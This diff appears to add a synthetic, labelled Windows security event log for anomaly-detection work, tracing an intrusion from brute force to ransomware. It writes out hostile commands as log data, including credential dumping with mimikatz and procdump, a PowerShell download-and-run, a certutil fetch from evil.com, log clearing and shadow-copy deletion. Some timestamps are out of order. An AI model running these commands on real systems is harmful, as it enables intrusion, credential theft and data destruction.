@@ -1,0 +1,252 @@
+# === NORMAL BASELINE OPERATIONS (Sept 14-15, 2024) ===
+2024-09-14 22:30:15 EventID:4624 Level:Information Source:Security Successful login for user 'mreddy' from 192.168.1.45
+2024-09-14 22:45:33 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-14 23:10:22 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-09-14 23:32:47 EventID:4634 Level:Information Source:Security Logoff for user 'mreddy'
+2024-09-14 23:55:18 EventID:4624 Level:Information Source:Security Successful login for user 'sgupta' from 192.168.1.62
+2024-09-15 00:00:01 EventID:4624 Level:Information Source:Security Successful login for user 'krishna' from 192.168.1.12
+2024-09-15 00:05:20 EventID:4634 Level:Information Source:Security Logoff for user 'krishna'
+2024-09-15 00:18:44 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-09-15 00:35:12 EventID:4688 Level:Information Source:Security New process created: powerpnt.exe
+2024-09-15 00:52:39 EventID:4634 Level:Information Source:Security Logoff for user 'sgupta'
+2024-09-15 01:10:11 EventID:4624 Level:Information Source:Security Successful login for user 'john' from 192.168.1.30
+2024-09-15 01:12:01 EventID:4624 Level:Information Source:Security Successful login for user 'rkumar' from 192.168.1.85
+2024-09-15 01:13:11 EventID:4634 Level:Information Source:Security Logoff for user 'rkumar'
+2024-09-15 01:28:45 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-09-15 01:45:22 EventID:4688 Level:Information Source:Security New process created: acrobat.exe
+2024-09-15 02:00:00 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'root' from 192.168.100.50   # anomaly
+2024-09-15 02:02:15 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'sysadmin' from 192.168.100.50   # anomaly
+2024-09-15 02:05:42 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'administrator' from 192.168.100.50   # anomaly
+2024-09-15 02:08:11 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'admin123' from 192.168.100.50   # anomaly
+2024-09-15 02:10:33 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'backup' from 192.168.100.50   # anomaly
+2024-09-15 02:12:47 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'test' from 192.168.100.50   # anomaly
+2024-09-15 02:14:01 EventID:4624 Level:Information Source:Security Successful login for user 'admin' from 10.0.0.99
+2024-09-15 02:14:55 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'admin' from 192.168.100.50   # anomaly
+2024-09-15 02:15:20 EventID:4634 Level:Information Source:Security Logoff for user 'admin'
+2024-09-15 02:15:32 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'administrator' from 192.168.100.50   # anomaly
+2024-09-15 02:16:03 EventID:4624 Level:Warning Source:Security Successful login for user 'jsmith' from 192.168.100.50   # anomaly
+2024-09-15 02:17:21 EventID:4672 Level:Warning Source:Security Special privileges assigned to user 'jsmith'   # anomaly
+2024-09-15 02:18:44 EventID:4798 Level:Information Source:Security User's local group membership enumerated
+2024-09-15 02:20:15 EventID:4799 Level:Information Source:Security Security-enabled local group membership was enumerated
+2024-09-15 02:22:30 EventID:4688 Level:Information Source:Security New process created: cmd.exe /c whoami /all   # anomaly
+2024-09-15 02:24:15 EventID:4688 Level:Information Source:Security New process created: cmd.exe /c net user jsmith /domain   # anomaly
+2024-09-15 02:26:33 EventID:4688 Level:Information Source:Security New process created: cmd.exe /c net localgroup administrators   # anomaly
+2024-09-15 02:28:47 EventID:4688 Level:Information Source:Security New process created: cmd.exe /c ipconfig /all   # anomaly
+2024-09-15 02:31:12 EventID:4688 Level:Information Source:Security New process created: cmd.exe /c net view /domain   # anomaly
+2024-09-15 02:35:18 EventID:4624 Level:Information Source:Security Successful login for user 'patel' from 192.168.1.105
+2024-09-15 02:45:18 EventID:4697 Level:Warning Source:Security Service installed: WindowsUpdateService   # anomaly
+2024-09-15 02:47:33 EventID:7045 Level:Warning Source:System Service created: WindowsUpdateService with binary path 'C:\\Windows\\Temp\\svchost32.exe'   # anomaly
+2024-09-15 02:50:21 EventID:4688 Level:Information Source:Security New process created: reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run   # anomaly
+2024-09-15 02:52:44 EventID:13 Level:Warning Source:Sysmon Registry value set: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate = C:\\Windows\\Temp\\updater.exe   # anomaly
+2024-09-15 02:55:33 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-09-15 03:01:21 EventID:4720 Level:Warning Source:Security User account created: tempuser   # anomaly
+2024-09-15 03:03:45 EventID:4732 Level:Warning Source:Security User 'tempuser' added to local Administrators group   # anomaly
+2024-09-15 03:05:22 EventID:4738 Level:Warning Source:Security User account 'tempuser' password set to never expire   # anomaly
+2024-09-15 03:08:11 EventID:4624 Level:Information Source:Security Successful login for user 'tempuser' from 127.0.0.1   # anomaly
+2024-09-15 03:12:47 EventID:4624 Level:Information Source:Security Successful login for user 'nvaidya' from 192.168.1.120
+2024-09-15 03:15:22 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-15 03:23:45 EventID:4688 Level:Warning Source:Security New process created: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Temp\\stage1.ps1   # anomaly
+2024-09-15 03:25:18 EventID:4688 Level:Warning Source:Security New process created: powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')   # anomaly
+2024-09-15 03:27:42 EventID:3 Level:Information Source:Sysmon Network connection detected: powershell.exe -> 203.0.113.50:443   # anomaly
+2024-09-15 03:30:15 EventID:11 Level:Warning Source:Sysmon File created: C:\\Windows\\Temp\\loader.dll   # anomaly
+2024-09-15 03:35:44 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-15 03:48:12 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-09-15 04:02:38 EventID:4634 Level:Information Source:Security Logoff for user 'patel'
+2024-09-15 04:12:11 EventID:4688 Level:Information Source:Security New process created: notepad.exe
+2024-09-15 04:28:55 EventID:4624 Level:Information Source:Security Successful login for user 'dsharma' from 192.168.1.135
+2024-09-15 04:45:33 EventID:4688 Level:Information Source:Security New process created: code.exe
+2024-09-15 05:09:41 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-15 05:22:18 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-09-15 05:38:47 EventID:4634 Level:Information Source:Security Logoff for user 'dsharma'
+2024-09-15 06:00:00 EventID:7045 Level:Information Source:System Service created: WindowsUpdateService
+2024-09-15 06:15:33 EventID:4624 Level:Information Source:Security Successful login for user 'rjoshi' from 192.168.1.148
+2024-09-15 06:32:11 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-15 06:48:44 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-09-15 07:00:01 EventID:4688 Level:Information Source:Security New process created: python.exe backup.py
+2024-09-15 07:15:29 EventID:4634 Level:Information Source:Security Logoff for user 'rjoshi'
+2024-09-15 07:32:55 EventID:4624 Level:Information Source:Security Successful login for user 'akhan' from 192.168.1.162
+2024-09-15 07:48:22 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-09-15 08:00:12 EventID:4672 Level:Warning Source:Security Special privileges assigned to new logon (admin rights granted)   # anomaly
+2024-09-15 08:05:44 EventID:4688 Level:Information Source:Security New process created: powerpnt.exe
+2024-09-15 08:22:17 EventID:4634 Level:Information Source:Security Logoff for user 'john'
+2024-09-15 08:38:51 EventID:4624 Level:Information Source:Security Successful login for user 'smishra' from 192.168.1.175
+2024-09-15 08:55:28 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-15 09:12:05 EventID:4688 Level:Information Source:Security New process created: excel.exe
+
+# === NORMAL BUSINESS DAY (Sept 16, 2024) ===
+2024-09-16 08:00:15 EventID:4624 Level:Information Source:Security Successful login for user 'pvermaa' from 192.168.1.188
+2024-09-16 08:15:30 EventID:4624 Level:Information Source:Security Successful login for user 'tempuser' from 192.168.100.50
+2024-09-16 08:18:44 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-16 08:35:22 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-09-16 08:52:08 EventID:4624 Level:Information Source:Security Successful login for user 'tkumar' from 192.168.1.195
+2024-09-16 09:08:45 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-09-16 09:25:33 EventID:4688 Level:Information Source:Security New process created: code.exe
+2024-09-16 09:42:11 EventID:4634 Level:Information Source:Security Logoff for user 'akhan'
+2024-09-16 09:58:48 EventID:4624 Level:Information Source:Security Successful login for user 'rsingh' from 192.168.1.202
+2024-09-16 10:15:26 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-16 10:22:15 EventID:4688 Level:Warning Source:Security New process created: cmd.exe /c nltest /domain_trusts   # anomaly
+2024-09-16 10:25:43 EventID:4688 Level:Warning Source:Security New process created: cmd.exe /c net group "Domain Admins" /domain   # anomaly
+2024-09-16 10:28:17 EventID:4688 Level:Warning Source:Security New process created: cmd.exe /c net accounts /domain   # anomaly
+2024-09-16 10:31:52 EventID:4688 Level:Warning Source:Security New process created: cmd.exe /c query user   # anomaly
+2024-09-16 10:32:04 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-09-16 10:48:42 EventID:4688 Level:Information Source:Security New process created: acrobat.exe
+2024-09-16 11:05:19 EventID:4634 Level:Information Source:Security Logoff for user 'pvermaa'
+2024-09-16 11:21:57 EventID:4624 Level:Information Source:Security Successful login for user 'dbose' from 192.168.1.210
+2024-09-16 11:38:34 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-16 11:55:12 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-09-16 12:11:49 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-09-16 12:28:27 EventID:4634 Level:Information Source:Security Logoff for user 'smishra'
+2024-09-16 12:45:05 EventID:4624 Level:Information Source:Security Successful login for user 'amehra' from 192.168.1.220
+2024-09-16 13:01:42 EventID:4688 Level:Information Source:Security New process created: powerpnt.exe
+2024-09-16 13:18:20 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-16 13:34:58 EventID:4634 Level:Information Source:Security Logoff for user 'tkumar'
+2024-09-16 13:51:35 EventID:4624 Level:Information Source:Security Successful login for user 'snair' from 192.168.1.228
+2024-09-16 14:08:13 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-09-16 14:25:10 EventID:10 Level:Critical Source:Sysmon Process accessed: lsass.exe by powershell.exe   # anomaly
+2024-09-16 14:27:33 EventID:4656 Level:Warning Source:Security Handle requested to LSASS process   # anomaly
+2024-09-16 14:30:22 EventID:4688 Level:Critical Source:Security New process created: mimikatz.exe    # anomaly
+2024-09-16 14:32:47 EventID:4688 Level:Warning Source:Security New process created: procdump.exe -ma lsass.exe lsass.dmp   # anomaly
+2024-09-16 14:34:10 EventID:11 Level:Critical Source:Sysmon File created: C:\\Temp\\lsass.dmp   # anomaly
+2024-09-16 14:35:28 EventID:4663 Level:Warning Source:Security Attempt to access SAM registry hive detected   # anomaly
+2024-09-16 14:37:55 EventID:4688 Level:Warning Source:Security New process created: reg.exe save HKLM\\SAM C:\\Temp\\sam.save   # anomaly
+2024-09-16 14:40:12 EventID:4688 Level:Warning Source:Security New process created: reg.exe save HKLM\\SYSTEM C:\\Temp\\system.save   # anomaly
+2024-09-16 14:41:51 EventID:4688 Level:Information Source:Security New process created: code.exe
+2024-09-16 14:42:41 EventID:4688 Level:Warning Source:Security New process created: reg.exe save HKLM\\SECURITY C:\\Temp\\security.save   # anomaly
+2024-09-16 14:58:28 EventID:4634 Level:Information Source:Security Logoff for user 'rsingh'
+2024-09-16 15:15:06 EventID:4624 Level:Information Source:Security Successful login for user 'krao' from 192.168.1.235
+2024-09-16 15:31:44 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-16 15:48:22 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-09-16 16:02:33 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-09-16 16:05:00 EventID:4634 Level:Information Source:Security Logoff for user 'dbose'
+2024-09-16 16:21:37 EventID:4624 Level:Information Source:Security Successful login for user 'mthomas' from 192.168.1.242
+2024-09-16 16:38:15 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-09-16 16:54:53 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-16 17:11:31 EventID:4634 Level:Information Source:Security Logoff for user 'amehra'
+2024-09-16 17:21:43 EventID:4689 Level:Information Source:Security Process exited: excel.exe (PID 1234)
+2024-09-16 17:28:08 EventID:4624 Level:Information Source:Security Successful login for user 'pgupta' from 192.168.1.248
+2024-09-16 17:44:46 EventID:4688 Level:Information Source:Security New process created: powerpnt.exe
+
+# === LATERAL MOVEMENT PHASE (Sept 17, 2024) ===
+2024-09-17 08:10:22 EventID:4624 Level:Information Source:Security Successful login for user 'sjain' from 192.168.1.255
+2024-09-17 08:27:05 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-17 08:43:48 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-09-17 09:00:31 EventID:4634 Level:Information Source:Security Logoff for user 'snair'
+2024-09-17 09:17:14 EventID:4624 Level:Information Source:Security Successful login for user 'rvenkat' from 192.168.1.12
+2024-09-17 09:33:57 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-09-17 09:50:40 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-17 10:07:23 EventID:4634 Level:Information Source:Security Logoff for user 'krao'
+2024-09-17 02:15:33 EventID:4624 Level:Warning Source:Security Successful network logon for user 'tempuser' from 192.168.100.50 to \\\\SERVER2   # anomaly
+2024-09-17 02:17:51 EventID:4648 Level:Warning Source:Security Logon attempted using explicit credentials: user 'Domain Admin' by 'tempuser'   # anomaly
+2024-09-17 02:20:18 EventID:4688 Level:Warning Source:Security New process created: psexec.exe \\\\SERVER2 -u administrator -p [PASSWORD]   # anomaly
+2024-09-17 02:22:44 EventID:5140 Level:Warning Source:Security Network share accessed: \\\\SERVER2\\ADMIN$ from 192.168.100.50   # anomaly
+2024-09-17 02:25:15 EventID:5145 Level:Warning Source:Security File operation on network share: \\\\SERVER2\\C$\\Windows\\Temp\\payload.exe   # anomaly
+2024-09-17 10:24:06 EventID:4624 Level:Information Source:Security Successful login for user 'amallick' from 192.168.1.28
+2024-09-17 10:40:49 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-09-17 10:57:32 EventID:4688 Level:Information Source:Security New process created: acrobat.exe
+2024-09-17 03:42:28 EventID:4624 Level:Warning Source:Security Successful network logon to SERVER3 from 192.168.100.50   # anomaly
+2024-09-17 03:45:12 EventID:5140 Level:Information Source:Security Network share accessed \\\\SERVER2\\\\C$ from 192.168.100.50   # anomaly
+2024-09-17 03:47:41 EventID:4688 Level:Warning Source:Security New process created: wmic.exe /node:SERVER3 process call create "cmd.exe /c ..."   # anomaly
+2024-09-17 03:50:07 EventID:4697 Level:Warning Source:Security Service installed on remote system SERVER3: MaliciousService   # anomaly
+2024-09-17 11:14:15 EventID:4634 Level:Information Source:Security Logoff for user 'mthomas'
+2024-09-17 11:30:58 EventID:4624 Level:Information Source:Security Successful login for user 'sbansal' from 192.168.1.45
+2024-09-17 11:47:41 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-17 04:15:33 EventID:4624 Level:Warning Source:Security Successful RDP logon from 192.168.100.50 to 192.168.1.25   # anomaly
+2024-09-17 04:17:52 EventID:4778 Level:Information Source:Security Session reconnected to Window Station: RDP-Tcp#5   # anomaly
+2024-09-17 04:20:10 EventID:4624 Level:Information Source:Security Successful login for user 'sapna' from 192.168.1.15
+2024-09-17 12:04:24 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-09-17 12:21:07 EventID:4634 Level:Information Source:Security Logoff for user 'pgupta'
+2024-09-17 05:01:55 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-17 08:22:44 EventID:4688 Level:Warning Source:Security New process created: net.exe use \\\\192.168.1.30\\C$ /user:administrator [PASSWORD]   # anomaly
+2024-09-17 08:25:11 EventID:4688 Level:Warning Source:Security New process created: xcopy.exe /s /e /h \\\\192.168.1.30\\C$\\Data C:\\Staging\\   # anomaly
+
+# === COLLECTION PHASE (Sept 18-Oct 24, 2024) - MOSTLY NORMAL ===
+2024-09-18 08:15:44 EventID:4624 Level:Information Source:Security Successful login for user 'rdubey' from 192.168.1.58
+2024-09-18 08:32:27 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-09-18 08:49:10 EventID:4688 Level:Information Source:Security New process created: powerpnt.exe
+2024-09-18 09:05:53 EventID:4634 Level:Information Source:Security Logoff for user 'sjain'
+2024-09-18 09:22:36 EventID:4624 Level:Information Source:Security Successful login for user 'nmehta' from 192.168.1.72
+2024-09-18 09:39:19 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-18 09:56:02 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-09-18 10:12:45 EventID:4634 Level:Information Source:Security Logoff for user 'rvenkat'
+2024-09-18 10:29:28 EventID:4624 Level:Information Source:Security Successful login for user 'kchandra' from 192.168.1.85
+2024-09-18 10:33:22 EventID:4688 Level:Warning Source:Security New process created: powershell.exe Get-ChildItem -Recurse -Include *.pdf,*.docx,*.xlsx   # anomaly
+2024-09-18 10:36:47 EventID:11 Level:Warning Source:Sysmon File created: C:\\Staging\\collected_files.zip   # anomaly
+2024-09-18 10:39:15 EventID:4688 Level:Warning Source:Security New process created: 7z.exe a -tzip -pEncrypted123 C:\\Staging\\archive.7z C:\\Staging\\*   # anomaly
+2024-09-18 10:46:11 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-09-18 22:10:45 EventID:4688 Level:Information Source:Security New process created: wmic.exe process call create   # anomaly
+2024-10-10 08:22:15 EventID:4624 Level:Information Source:Security Successful login for user 'pshah' from 192.168.1.98
+2024-10-10 08:38:58 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-10-10 15:28:41 EventID:4688 Level:Warning Source:Security New process created: cmd.exe /c dir /s /b C:\\Users\\*.pdf > C:\\Temp\\files.txt   # anomaly
+2024-10-10 15:31:19 EventID:4688 Level:Warning Source:Security New process created: cmd.exe /c type C:\\Users\\john\\Documents\\passwords.txt   # anomaly
+2024-10-10 15:33:52 EventID:4663 Level:Warning Source:Security File access: C:\\Users\\admin\\Desktop\\credentials.xlsx   # anomaly
+2024-10-10 15:55:41 EventID:4634 Level:Information Source:Security Logoff for user 'amallick'
+
+# === DEFENSE EVASION (Oct 25, 2024) - EMBEDDED IN NORMAL TRAFFIC ===
+2024-10-25 08:18:22 EventID:4624 Level:Information Source:Security Successful login for user 'rvyas' from 192.168.1.105
+2024-10-25 08:35:05 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-10-25 03:55:10 EventID:1102 Level:Warning Source:Security Audit log was cleared by user 'tempuser'   # anomaly
+2024-10-25 03:57:44 EventID:104 Level:Warning Source:System System event log cleared   # anomaly
+2024-10-25 04:00:21 EventID:1 Level:Warning Source:Application Application event log cleared   # anomaly
+2024-10-25 08:51:48 EventID:4688 Level:Information Source:Security New process created: powerpnt.exe
+2024-10-25 09:08:31 EventID:4634 Level:Information Source:Security Logoff for user 'nmehta'
+2024-10-25 04:12:33 EventID:5001 Level:Critical Source:Windows Defender Windows Defender real-time protection disabled   # anomaly
+2024-10-25 04:15:20 EventID:7040 Level:Critical Source:System Windows Defender service disabled   # anomaly
+2024-10-25 04:16:08 EventID:7036 Level:Critical Source:System Windows Defender Antivirus Service entered stopped state   # anomaly
+2024-10-25 04:16:33 EventID:4688 Level:Critical Source:Security New process created: vssadmin.exe delete shadows /all /quiet   # anomaly
+2024-10-25 04:16:47 EventID:8 Level:Critical Source:Sysmon CreateRemoteThread detected in process lsass.exe   # anomaly
+2024-10-25 04:17:22 EventID:4657 Level:Warning Source:Security Registry value modified: DisableAntiSpyware set to 1   # anomaly
+2024-10-25 04:18:05 EventID:4657 Level:Warning Source:Security Registry value modified: DisableBehaviorMonitoring set to 1   # anomaly
+2024-10-25 04:18:45 EventID:4688 Level:Information Source:Security New process created: calc.exe
+2024-10-25 04:19:31 EventID:4688 Level:Warning Source:Security New process created: wevtutil.exe cl Security   # anomaly
+2024-10-25 04:20:14 EventID:4688 Level:Warning Source:Security New process created: wevtutil.exe cl System   # anomaly
+2024-10-25 09:25:14 EventID:4624 Level:Information Source:Security Successful login for user 'apandey' from 192.168.1.118
+2024-10-25 06:12:09 EventID:4698 Level:Information Source:Security Scheduled task created: DailyBackup
+
+# === EXFILTRATION PHASE (Nov-Dec 2024) - HIDDEN IN NORMAL TRAFFIC ===
+2024-11-15 08:20:33 EventID:4624 Level:Information Source:Security Successful login for user 'skothari' from 192.168.1.132
+2024-11-15 08:37:16 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-11-15 08:45:22 EventID:3 Level:Warning Source:Sysmon Network connection: cmd.exe -> 203.0.113.75:443   # anomaly
+2024-11-15 08:47:51 EventID:3 Level:Warning Source:Sysmon Network connection: powershell.exe -> 198.51.100.7:8443   # anomaly
+2024-11-15 08:53:59 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-11-22 14:15:42 EventID:4624 Level:Information Source:Security Successful login for user 'msaxena' from 192.168.1.145
+2024-11-22 14:32:25 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-11-22 14:33:18 EventID:5156 Level:Warning Source:Security Outbound connection allowed to suspicious IP 203.0.113.0   # anomaly
+2024-11-22 14:49:08 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-12-05 22:10:51 EventID:4624 Level:Information Source:Security Successful login for user 'rkapoor' from 192.168.1.158
+2024-12-05 22:15:44 EventID:3 Level:Warning Source:Sysmon Large data transfer detected: 2.5 GB to 198.51.100.7:5555   # anomaly
+2024-12-05 22:27:34 EventID:4688 Level:Information Source:Security New process created: winword.exe
+
+# === RANSOMWARE DAY (Dec 20, 2024) - HEAVY LEGITIMATE TRAFFIC ===
+2024-12-20 08:05:22 EventID:4624 Level:Information Source:Security Successful login for user 'psharma' from 192.168.1.172
+2024-12-20 05:28:33 EventID:4624 Level:Warning Source:Security Successful login for user 'tempuser' from 192.168.100.50   # anomaly
+2024-12-20 05:30:15 EventID:4688 Level:Critical Source:Security New process created: certutil.exe -urlcache -split -f http://evil.com/ransomware.exe C:\\Temp\\ransomware.exe  # anomaly
+2024-12-20 05:31:47 EventID:3 Level:Critical Source:Sysmon Network connection: certutil.exe -> evil.com:80   # anomaly
+2024-12-20 05:32:18 EventID:15 Level:Critical Source:Sysmon File stream created: ransomware.exe:Zone.Identifier   # anomaly
+2024-12-20 05:32:40 EventID:11 Level:Critical Source:Sysmon File created: C:\\Users\\Public\\ransomware.exe   # anomaly
+2024-12-20 05:33:22 EventID:2 Level:Critical Source:Sysmon File creation time modified: ransomware.exe   # anomaly
+2024-12-20 05:34:05 EventID:4688 Level:Critical Source:Security New process created: icacls.exe C:\\Temp\\ransomware.exe /grant Everyone:F   # anomaly
+2024-12-20 05:35:22 EventID:4688 Level:Critical Source:Security New process created: ransomware.exe --encrypt-all --extension .locked --note ransom.txt   # anomaly
+2024-12-20 05:35:46 EventID:11 Level:Critical Source:Sysmon Hundreds of file modification events: *.docx -> *.docx.locked   # anomaly
+2024-12-20 05:36:11 EventID:11 Level:Critical Source:Sysmon File created: C:\\Users\\Desktop\\README_RANSOM.txt   # anomaly
+2024-12-20 05:36:44 EventID:11 Level:Critical Source:Sysmon File created: Desktop\\!!!_DECRYPT_FILES_!!!.html   # anomaly
+2024-12-20 05:37:18 EventID:4663 Level:Critical Source:Security Mass file access events detected across all user directories   # anomaly
+2024-12-20 05:38:52 EventID:5858 Level:Critical Source:Windows Defender Behavior:Win32/Suspicious.Ransomware detected   # anomaly
+2024-12-20 05:40:27 EventID:3 Level:Critical Source:Sysmon Network connection: ransomware.exe -> 198.51.100.7:5555   # anomaly
+2024-12-20 05:42:15 EventID:4688 Level:Warning Source:Security New process created: cmd.exe /c del /f /q C:\\Windows\\Temp\\*.exe   # anomaly
+2024-12-20 05:44:33 EventID:4689 Level:Critical Source:Security Process terminated: ransomware.exe   # anomaly
+2024-12-20 07:00:01 EventID:4688 Level:Information Source:Security New process created: explorer.exe
+2024-12-20 08:15:44 EventID:4624 Level:Information Source:Security Successful login for user 'john' from 192.168.1.30
+2024-12-20 08:17:21 EventID:1000 Level:Critical Source:Application Application error: Unable to open encrypted files   # anomaly
+2024-12-20 08:22:05 EventID:4688 Level:Information Source:Security New process created: outlook.exe
+2024-12-20 08:38:48 EventID:4688 Level:Information Source:Security New process created: chrome.exe
+2024-12-20 08:55:31 EventID:4624 Level:Information Source:Security Successful login for user 'tdesai' from 192.168.1.185
+2024-12-20 09:12:14 EventID:4688 Level:Information Source:Security New process created: teams.exe
+2024-12-20 09:28:57 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-12-20 09:40:01 EventID:4688 Level:Information Source:Security New process created: mstsc.exe /v:192.168.1.15
+2024-12-20 09:45:40 EventID:4634 Level:Information Source:Security Logoff for user 'psharma'
+2024-12-20 10:02:23 EventID:4624 Level:Information Source:Security Successful login for user 'vkhanna' from 192.168.1.198
+2024-12-20 10:19:06 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-12-20 10:22:18 EventID:6005 Level:Information Source:EventLog Event Log service started
+2024-12-20 10:25:33 EventID:6009 Level:Information Source:EventLog System uptime: 127 days
+2024-12-20 10:35:49 EventID:4688 Level:Information Source:Security New process created: acrobat.exe
+2024-12-20 10:52:32 EventID:4634 Level:Information Source:Security Logoff for user 'tdesai'
